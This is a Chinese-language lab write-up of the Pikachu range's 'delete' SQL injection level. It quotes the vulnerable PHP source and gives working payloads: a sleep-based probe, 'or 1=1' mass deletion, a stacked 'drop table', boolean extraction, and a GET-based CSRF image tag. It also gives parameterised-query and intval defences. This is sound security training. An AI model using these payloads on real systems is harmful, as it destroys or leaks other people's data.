# "delete" 注入 通关笔记
> 这一关的注入点在**删除按钮**上。
>
> 而且有意思的是：源码里原本有 `is_numeric()` 的判断，但**被注释掉了**。
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | SQL-Inject → "delete"注入 |
| 页面地址 | `http://pikachu/vul/sqli/sqli_del.php` |
| 提交方式 | GET |
| 参数名 | `id` |
| 目标 | 在删除操作里注入 |
页面是一个留言板，留言后面有「删除」链接。
---
## 二、我的解题步骤
### 步骤 1：先看删除链接
点「删除」，地址是：
```
sqli_del.php?id=58
```
**`id` 直接拼在 URL 里。**
### 步骤 2：试探——在不删数据的前提下验证注入
直接发 `?id=1 or 1=1` 会把所有留言删光，风险太大。
先用**时间盲注**验证：
```
?id=58 and sleep(2)
```
代入 SQL：
```sql
delete from message where id=58 and sleep(2)
```
- `sleep(2)` 返回 0（假）
- `id=58 and 0` → 条件不成立
- **不会删任何数据**，但会执行 2 秒
我实测：
| 请求 | 耗时 |
| --- | --- |
| `?id=58 and sleep(2)` | **2.03 秒** |
| `?id=58`（正常） | 0.05 秒 |
**延时生效 = SQL 注入成立。**
而且测完检查，留言还是 1 条——**没有误删。**
### 步骤 3：正式利用
确认之后，可以：
```sql
-- 删除所有留言
?id=1 or 1=1
-- 删整张表（堆叠注入，需要 mysqli_multi_query）
?id=1; drop table message
```
### 步骤 4：更隐蔽的利用——布尔盲注
删除操作不返回数据，但能通过"删除成功/失败"判断真假：
```
?id=58 and 1=1     -> 删除成功（跳转）
?id=58 and 1=2     -> 删除失败（红字提示）
```
**借这个"成功/失败"，就能一位一位地把数据"问"出来。**
---
## 三、原理分析
### 3.1 源码
```php
// if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){
//没对传进来的id进行处理，导致DEL注入
if(array_key_exists('id', $_GET)){
    $query="delete from message where id={$_GET['id']}";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)==1){
        header("location:sqli_del.php");
    }else{
        $html.="<p style='color: red'>删除失败,检查下数据库是不是挂了</p>";
    }
}
```
**关键就是那行被注释掉的代码：**
```php
// if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){
```
原本有 `is_numeric($_GET['id'])` 的保护，但它被注释掉了。
**注释掉一行代码，就打开了一个漏洞。**
### 3.2 为什么 `is_numeric` 能防住
```php
is_numeric("58")        // true
is_numeric("58 and 1=1") // false
is_numeric("58 or 1=1")  // false
```
只要不是纯数字，直接拒绝——**注入 payload 一个都过不去。**
### 3.3 为什么 delete 注入危害大
| 操作 | 后果 |
| --- | --- |
| `or 1=1` | 删光整张表 |
| `; drop table` | 表直接没了 |
| 布尔盲注 | 一点点把数据读出来 |
| 时间盲注 | 无声无息地读数据 |
**而且删除操作往往"一点就生效"，没有二次确认。**
---
## 四、知识点与笔记
### 4.1 delete 注入的探测
| 方法 | payload | 特点 |
| --- | --- | --- |
| 时间盲注 | `id=58 and sleep(2)` | **最安全**，不删数据 |
| 布尔判断 | `id=58 and 1=1` / `and 1=2` | 看"删除成功/失败" |
| 直接删 | `id=1 or 1=1` | 破坏性，慎用 |
**练习时优先用时间盲注——能证明漏洞，又不破坏数据。**
### 4.2 为什么这里能堆叠注入
```php
$result=execute($link, $query);
```
而 `execute()` 用的是 `mysqli_query()`——**它不支持多条语句**。
所以 `; drop table` 这类堆叠注入**在这个页面不生效**（`mysqli_query` 只执行第一条）。
能堆叠需要：
- `mysqli_multi_query()`
- PDO 的 `PDO::MYSQL_ATTR_MULTI_STATEMENTS`（默认开）
- 某些 ORM 的批量执行
### 4.3 删除操作的 CSRF 叠加
如果删除是 GET 请求、又没有 token，那它同时也是一个 **CSRF 漏洞**：
```html
<img src="http://target/sqli_del.php?id=58">
```
受害者打开页面，图片加载 → 删除请求发出 → 数据没了。
**这关的删除链接正好是 GET，所以它同时也是 CSRF 点。**
### 4.4 真实场景中的 delete 注入
常见位置：
| 位置 | 例子 |
| --- | --- |
| 删除按钮 | `?id=1` |
| 批量删除 | `?ids=1,2,3` |
| 清空回收站 | `?action=clear` |
| 取消订单 | `?order_id=123` |
**这类接口往往"点一下就执行"，没有二次确认，风险更高。**
---
## 五、和其他几关的区别
| 关卡 | SQL 操作 | 能不能回显数据 |
| --- | --- | --- |
| 数字型 / 字符型 | select | 能 |
| insert / update | 写 | 不能（只能看报错） |
| **delete** | **delete** | **不能（只能看成功/失败）** |
**从"能看数据"到"只能看成功失败"，探测难度上了一档。**
---
## 六、防御怎么写
### 6.1 参数化
```php
$stmt = $link->prepare("delete from message where id=?");
$stmt->bind_param('i', $id);
$stmt->execute();
```
### 6.2 类型强转
```php
$id = intval($_GET['id']);
if ($id <= 0) exit('非法参数');
$query = "delete from message where id=$id";
```
**这是源码里原本想做的事，只是被注释掉了。**
### 6.3 加二次确认 + POST
```html
<form method="post" action="delete.php" onsubmit="return confirm('确定删除？')">
  <input type="hidden" name="id" value="58">
  <input type="hidden" name="token" value="...">
  <button>删除</button>
</form>
```
**POST + token + 二次确认，三件套。**
### 6.4 软删除
```sql
update message set deleted=1 where id=?
```
**不真删，还能恢复**——这是业务层面的兜底。
---
## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 删除操作也能注入 |
| 关键点 | `is_numeric` 被注释掉了 |
| 探测 | `id=58 and sleep(2)` 带动时间盲注（不破坏数据） |
| 实测 | 耗时 2.03 秒，留言未删 |
| 修复 | 参数化 / `intval` / POST + token |
**一句话**：
> **注释掉一行 `is_numeric`，就打开了一个能删库的洞。**
---
## 参考
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [MySQL: DELETE](https://dev.mysql.com/doc/refman/8.0/en/delete.html)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
